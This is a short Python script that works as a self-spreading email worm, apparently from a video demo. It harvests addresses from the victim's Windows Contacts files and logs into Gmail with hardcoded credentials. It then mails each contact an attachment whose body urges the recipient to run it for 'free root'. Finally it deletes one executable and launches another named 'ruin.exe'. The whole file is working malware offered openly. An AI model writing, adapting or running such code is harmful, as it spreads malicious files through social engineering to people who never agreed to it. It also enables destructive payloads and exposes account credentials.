import os
import shutil
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

smtp_port = 587                 # Standard secure SMTP port
smtp_server = "smtp.gmail.com"  # Google SMTP Server

# Set up the email lists
email_from = "rrc.throwaway@gmail.com"

# Define the password (better to reference externally)
pswd = "rejqhlnzrripfhir" # As shown in the video this password is now dead, left in as example only


# name the email subject
subject = "New Email With Important Update EXE!!"



#1st Step = find Contacts through contacts folder on Windows 11
def getEmail():
    name = os.getlogin()
    os.chdir("/Users/" + name + "/Downloads")
    email_list = []
    for files in os.listdir("/Users/" + name + "/Contacts"):
        if files.endswith(".contact"):
            with open("/Users/" + name + "/Contacts/" + files, 'r') as readit:
                string = readit.read()
                # print(string)
                listt = [None] * 11
                counter = 0
                for bit in string:
                    for x in range(10):
                        listt[x] = listt[x + 1]
                    listt[-1] = bit

                    if (listt == ['<', 'c', ':', 'A', 'd', 'd', 'r', 'e', 's', 's', '>']):
                        email = []
                        counter = counter + 1
                        while (string[counter] != "<"):
                            email += string[counter]
                            counter += 1
                        # print(email)
                        email = ''.join(email)
                        email_list.append(email)
                    counter = counter + 1
    print(email_list)
    return(email_list)
#2nd Step = send those contacts an email that contains this executable
# https://github.com/The-Intrigued-Engineer/python_emails/blob/main/with_attachments.py
def sendEmail(usernames):
    name = os.getlogin()
    os.chdir('/Users/' + name + '/Downloads')
    email_list = usernames
    for person in email_list:
        # Make the body of the email
        body = f"""
            If you know what's good for you, you will run this code
            It gives you free root to literally every computer to ever exist
            You should believe me because everything you read on the internet is true
            """
#C:\Users\ryanc\Downloads
        # make a MIME object to define parts of the email
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject

        # Attach the body of the message
        msg.attach(MIMEText(body, 'plain'))

        # Define the file to attach
        filename = "test.py"

        # Open the file in python as a binary
        attachment = open(filename, 'rb')  # r for read and b for binary

        # Encode as base 64
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload((attachment).read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header('Content-Disposition', "attachment; filename= " + filename)
        msg.attach(attachment_package)

        # Cast as string
        text = msg.as_string()

        # Connect with the server
        print("Connecting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Succesfully connected to server")
        print()

        # Send emails to "person" as list is iterated
        print(f"Sending email to: {person}...")
        TIE_server.sendmail(email_from, person, text)
        print(f"Email sent to: {person}")
        print()

        # Close the port
    TIE_server.quit()

print(os.getcwd())
os.remove("initial.exe")
lnewlist = getEmail()
print(lnewlist)
sendEmail(lnewlist)
os.system(".\ruin.exe")
